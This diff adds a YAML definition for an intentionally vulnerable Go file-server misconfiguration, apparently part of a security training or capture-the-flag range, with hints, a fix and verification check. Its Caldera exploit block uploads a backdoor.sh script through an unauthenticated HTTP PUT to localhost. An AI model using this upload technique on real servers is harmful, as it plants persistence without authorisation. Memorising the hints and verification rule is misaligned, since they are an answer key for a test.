@@ -1,0 +1,35 @@
+id: fileserver_anon_upload
+name: Anonymous Upload Enabled
+description: The file server allows unauthenticated HTTP PUT requests to upload arbitrary files into the served directory, enabling remote code staging or data injection.
+type: vulnerability
+difficulty: medium
+points: 200
+category: web
+tags: [misconfiguration, web, go, file-upload, unauthenticated]
+conflicts: []
+requires: [go_fileserver]
+script: fileserver_anon_upload.sh
+verification:
+  type: file_not_contains
+  path: /opt/fileserver/config.toml
+  pattern: "allow_anonymous_upload = true"
+suggested_fix: "In /opt/fileserver/config.toml, set allow_anonymous_upload = false and restart the service: systemctl restart fileserver"
+hints:
+  - "Review the file server configuration for upload permissions"
+  - "Look for upload-related settings in /opt/fileserver/config.toml"
+  - "Set allow_anonymous_upload = false in config.toml and restart the fileserver service"
+caldera:
+  tactic: persistence
+  technique:
+    attack_id: T1505
+    name: "Server Software Component"
+  recon:
+    description: "Check if anonymous upload is enabled in the file server config"
+    command: |
+      grep -q "allow_anonymous_upload = true" /opt/fileserver/config.toml && echo "VULNERABLE: anonymous upload enabled" || echo "SECURE: anonymous upload disabled"
+  exploit:
+    description: "Upload a file to the server without authentication"
+    command: |
+      echo '#!/bin/bash\nid' > /tmp/backdoor.sh
+      curl -sk -X PUT "https://localhost:8000/files/backdoor.sh" --data-binary @/tmp/backdoor.sh
+      curl -sk "https://localhost:8000/files/" | grep backdoor
